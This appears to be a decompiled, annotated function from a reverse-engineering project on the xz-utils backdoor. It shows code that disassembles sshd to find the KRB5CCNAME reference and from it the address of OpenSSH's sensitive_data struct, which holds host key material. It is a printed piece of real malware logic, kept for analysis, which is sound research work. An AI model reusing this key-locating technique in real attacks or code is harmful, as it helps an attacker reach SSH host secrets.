// /home/kali/xzre-ghidra/xzregh/103340_sshd_get_sensitive_data_address_via_krb5ccname.c
// Function: sshd_get_sensitive_data_address_via_krb5ccname @ 0x103340
// Calling convention: __stdcall
// Prototype: BOOL __stdcall sshd_get_sensitive_data_address_via_krb5ccname(u8 * data_start, u8 * data_end, u8 * code_start, u8 * code_end, void * * sensitive_data_out, elf_info_t * elf)


/*
 * AutoDoc: Starts from the unique reference to `"KRB5CCNAME"` and walks forward through the surrounding basic blocks. It only
 * accepts MOV/LEA instructions that copy getenv's return value into memory inside sshd's .data/.bss range with the same
 * -0x18 displacement pattern used by OpenSSH's `sensitive_data` struct. The address (minus 0x18) is returned as the
 * candidate base pointer that later holds host key material and Kerberos cache metadata.
 */

#include "xzre_types.h"

BOOL sshd_get_sensitive_data_address_via_krb5ccname
               (u8 *data_start,u8 *data_end,u8 *code_start,u8 *code_end,void **sensitive_data_out,
               elf_info_t *elf)

{
  u8 dest_reg;
  BOOL decode_ok;
  u8 *krb5_string_ref;
  u8 *candidate_store;
  uint probe_depth;
  long clear_idx;
  u8 rex_extension;
  u8 *data_cursor;
  u8 *store_scan_cursor;
  dasm_ctx_t *zero_ctx_cursor;
  u8 tracked_reg;
  u8 zero_seed;
  dasm_ctx_t string_scan_ctx;
  dasm_ctx_t store_scan_ctx;
  
  zero_seed = 0;
  zero_ctx_cursor = &string_scan_ctx;
  for (clear_idx = 0x16; clear_idx != 0; clear_idx = clear_idx + -1) {
    *(undefined4 *)&zero_ctx_cursor->instruction = 0;
    zero_ctx_cursor = (dasm_ctx_t *)((long)&zero_ctx_cursor->instruction + 4);
  }
  *sensitive_data_out = (void *)0x0;
  krb5_string_ref = elf_find_string_reference(elf,STR_KRB5CCNAME,code_start,code_end);
  if (krb5_string_ref != (u8 *)0x0) {
    while (krb5_string_ref < code_end) {
      decode_ok = x86_dasm(&string_scan_ctx,krb5_string_ref,code_end);
      if (decode_ok == FALSE) {
        krb5_string_ref = krb5_string_ref + 1;
      }
      else {
        if ((*(u32 *)&string_scan_ctx.opcode_window[3] & 0xfffffffd) == 0xb1) {
          if (string_scan_ctx.prefix.decoded.modrm.breakdown.modrm_mod == '\x03') {
            if (((string_scan_ctx.prefix.flags_u16 & 0x20) == 0) ||
               (((byte)string_scan_ctx.prefix.decoded.rex & 8) == 0)) {
              dest_reg = string_scan_ctx.prefix.decoded.flags & 0x40;
              if ((string_scan_ctx.prefix.flags_u16 & 0x1040) == 0) {
                if ((string_scan_ctx.prefix.flags_u16 & 0x40) != 0) {
                  tracked_reg = 0;
                  dest_reg = string_scan_ctx.prefix.decoded.modrm.breakdown.modrm_rm;
                  if ((string_scan_ctx.prefix.flags_u16 & 0x20) != 0) {
LAB_00103450:
                    dest_reg = string_scan_ctx.prefix.decoded.modrm.breakdown.modrm_rm | ((byte)string_scan_ctx.prefix.decoded.rex & 1) << 3;
                  }
                  goto LAB_0010345d;
                }
                tracked_reg = 0;
              }
              else {
                if ((string_scan_ctx.prefix.flags_u16 & 0x40) == 0) {
                  tracked_reg = string_scan_ctx.prefix.decoded.flags2 & 0x10;
                  if ((string_scan_ctx.prefix.flags_u16 & 0x1000) == 0) goto LAB_0010346b;
                  tracked_reg = string_scan_ctx.mov_imm_reg_index;
                  if ((string_scan_ctx.prefix.flags_u16 & 0x20) != 0) {
                    tracked_reg = string_scan_ctx.mov_imm_reg_index |
                             ((byte)string_scan_ctx.prefix.decoded.rex & 1) << 3;
                  }
                }
                else {
                  tracked_reg = string_scan_ctx.prefix.decoded.modrm.breakdown.modrm_reg;
                  dest_reg = string_scan_ctx.prefix.decoded.modrm.breakdown.modrm_rm;
                  if ((string_scan_ctx.prefix.flags_u16 & 0x20) != 0) {
                    tracked_reg = string_scan_ctx.prefix.decoded.modrm.breakdown.modrm_reg |
                             (char)string_scan_ctx.prefix.decoded.rex * '\x02' & 8U;
                    goto LAB_00103450;
                  }
                }
LAB_0010345d:
                if (dest_reg != tracked_reg) goto LAB_001033d1;
              }
LAB_0010346b:
              zero_ctx_cursor = &store_scan_ctx;
              for (clear_idx = 0x16; clear_idx != 0; clear_idx = clear_idx + -1) {
                *(undefined4 *)&zero_ctx_cursor->instruction = 0;
                zero_ctx_cursor = (dasm_ctx_t *)((long)zero_ctx_cursor + (ulong)zero_seed * -8 + 4);
              }
              store_scan_cursor = string_scan_ctx.instruction + string_scan_ctx.instruction_size;
              probe_depth = 0;
              while (((store_scan_cursor < code_end && (probe_depth < 6)) &&
                     (decode_ok = x86_dasm(&store_scan_ctx,store_scan_cursor,code_end), decode_ok != FALSE))) {
                if (*(u32 *)&store_scan_ctx.opcode_window[3] == 0x109) {
                  if (((uint)store_scan_ctx.prefix.decoded.modrm & 0xff00ff00) == 0x5000000) {
                    dest_reg = 0;
                    if ((store_scan_ctx.prefix.flags_u16 & 0x1040) != 0) {
                      if ((store_scan_ctx.prefix.flags_u16 & 0x40) == 0) {
                        dest_reg = store_scan_ctx.prefix.decoded.flags2 & 0x10;
                        if (((store_scan_ctx.prefix.flags_u16 & 0x1000) != 0) &&
                           (dest_reg = store_scan_ctx.mov_imm_reg_index,
                           (store_scan_ctx.prefix.flags_u16 & 0x20) != 0)) {
                          rex_extension = (char)store_scan_ctx.prefix.decoded.rex << 3;
                          goto LAB_00103553;
                        }
                      }
                      else {
                        dest_reg = store_scan_ctx.prefix.decoded.modrm.breakdown.modrm_reg;
                        if ((store_scan_ctx.prefix.flags_u16 & 0x20) != 0) {
                          rex_extension = (char)store_scan_ctx.prefix.decoded.rex * '\x02';
LAB_00103553:
                          dest_reg = dest_reg | rex_extension & 8;
                        }
                      }
                    }
                    if (dest_reg == tracked_reg) {
                      candidate_store = (u8 *)0x0;
                      if ((store_scan_ctx.prefix.flags_u16 & 0x100) != 0) {
                        candidate_store = store_scan_ctx.instruction +
                                 store_scan_ctx.instruction_size + store_scan_ctx.mem_disp;
                      }
                      data_cursor = candidate_store + -0x18;
                      if ((data_start <= data_cursor && candidate_store != (u8 *)0x18) && (candidate_store + 4 <= data_end)
                         ) goto LAB_0010365f;
                    }
                  }
                }
                else if (*(u32 *)&store_scan_ctx.opcode_window[3] == 0xa5fe) break;
                store_scan_cursor = store_scan_cursor + store_scan_ctx.instruction_size;
                probe_depth = probe_depth + 1;
              }
            }
          }
        }
        else if (*(u32 *)&string_scan_ctx.opcode_window[3] == 0x147) {
          if ((((((byte)string_scan_ctx.prefix.decoded.rex & 8) == 0) &&
               ((uint)string_scan_ctx.prefix.decoded.modrm >> 8 == 0x50000)) &&
              ((string_scan_ctx.prefix.flags_u16 & 0x800) != 0)) && (string_scan_ctx.imm_zeroextended == 0)) {
            store_scan_cursor = (u8 *)0x0;
            if ((string_scan_ctx.prefix.flags_u16 & 0x100) != 0) {
              store_scan_cursor = string_scan_ctx.instruction + string_scan_ctx.instruction_size + string_scan_ctx.mem_disp;
            }
            data_cursor = store_scan_cursor + -0x18;
            if (((store_scan_cursor + 4 <= data_end) && (data_start <= data_cursor)) && (data_cursor != (u8 *)0x0)) {
LAB_0010365f:
              *sensitive_data_out = data_cursor;
              return TRUE;
            }
          }
        }
        else if ((*(u32 *)&string_scan_ctx.opcode_window[3] == 0xa5fe) && (code_start != string_scan_ctx.instruction)) {
          return FALSE;
        }
LAB_001033d1:
        krb5_string_ref = krb5_string_ref + string_scan_ctx.instruction_size;
      }
    }
  }
  return FALSE;
}

